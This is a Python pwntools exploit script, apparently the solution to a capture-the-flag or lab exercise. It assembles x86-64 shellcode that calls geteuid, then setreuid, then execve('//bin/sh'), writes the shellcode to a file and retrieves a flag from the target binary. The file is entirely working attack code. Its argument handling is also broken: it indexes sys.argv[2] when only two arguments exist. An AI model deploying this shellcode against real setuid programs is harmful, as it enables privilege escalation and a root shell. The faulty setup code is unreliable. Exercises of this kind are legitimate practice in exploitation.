#!/usr/bin/env python
from pwn import *
import pwn
import helpers

########################################################
# Exploit
########################################################

arch = 'x86-64'
shellcode = '''
    .att_syntax
    .att_mnemonic

    // write your assembly here

    mov $0x6c, %rax
    syscall
                
    cltd

    mov %rax, %rdi
    mov %rax, %rsi
    mov $0x72, %rax
    syscall

    mov $0x3b, %rax
    mov $0x68732f6e69622f2f, %rbx
    push $0
    push %rbx

    mov %rsp, %rdi
    mov $0, %rsi
    mov %rsi, %rdx
    syscall
'''
compiled = asm(shellcode, arch=arch)
print(compiled)

with open('shellcode.bin', 'wb') as f:
    f.write(compiled)

########################################################
# Setup                                                #
########################################################
prog = './'
if len(sys.argv) == 2:
  prog += sys.argv[2]
else:
  prog += os.path.basename(os.getcwd())
  prog = prog[:2] + prog[5:]

elf = pwn.ELF(prog)
flag = helpers.get_flag(elf,"")
pwn.info(f'Flag: {flag}')
